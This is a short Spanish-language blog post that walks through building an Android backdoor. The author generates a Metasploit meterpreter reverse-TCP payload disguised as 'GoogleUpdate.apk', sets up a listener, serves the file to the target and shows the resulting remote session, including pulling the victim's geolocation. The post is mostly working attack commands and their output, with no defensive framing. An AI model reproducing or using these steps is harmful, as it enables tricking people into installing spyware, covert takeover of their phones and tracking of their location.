---
layout: post
title: "Android Backdoor"
date: 2016-11-08 10:26:04 -0500
categories: crypto
---

Los Backdoors son programas diseñados para abrir **puertas traseras** en sistemas remotos de información de tal forma que se pueda tener acceso a ellos de forma oculta y no autorizada.

Creamos el backdoor y dejamos un handler esperando conexiones.

IP del equipo atacante: 192.168.1.35

    $ msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.1.35 lport=6666 -o GoogleUpdate.apk
    No platform was selected, choosing Msf::Module::Platform::Android from the payload
    No Arch selected, selecting Arch: dalvik from the payload
    No encoder or badchars specified, outputting raw payload
    Payload size: 8315 bytes
    Saved as: GoogleUpdate.apk

    $ msfconsole

    msf > use exploit/multi/handler
    msf exploit(handler) > set payload android/meterpreter/reverse_tcp
    payload => android/meterpreter/reverse_tcp
    msf exploit(handler) > set LHOST 192.168.1.35
    LHOST => 192.168.1.35
    msf exploit(handler) > set LPORT 6666
    LPORT => 6666
    msf exploit(handler) > run
    [*] Started reverse TCP handler on 192.168.1.35:6666
    [*] Starting the payload handler...

Arrancamos un servidor web para que el objetivo pueda acceder al backdoor.

    $ python -m CGIHTTPServer

El objetivo ejecuta el backdoor y se obtiene acceso remoto

    [*] Sending stage (66498 bytes) to 192.168.1.31
    [*] Meterpreter session 1 opened (192.168.1.35:6666 -> 192.168.1.31:42473) at 2016-11-07 13:16:34 -0500

    meterpreter > sysinfo
    Computer    : localhost
    OS          : Android 4.0.3 - Linux 3.0.8-379370-user (armv7l)
    Meterpreter : java/android
    meterpreter > wlan_geolocate
    [*] Google indicates the device is thin 150 meters of 2.9113409,-76.0365285.
    [*] Google Maps URL: https://maps.google.com/?q=2.9113409,-76.0365285
    meterpreter >
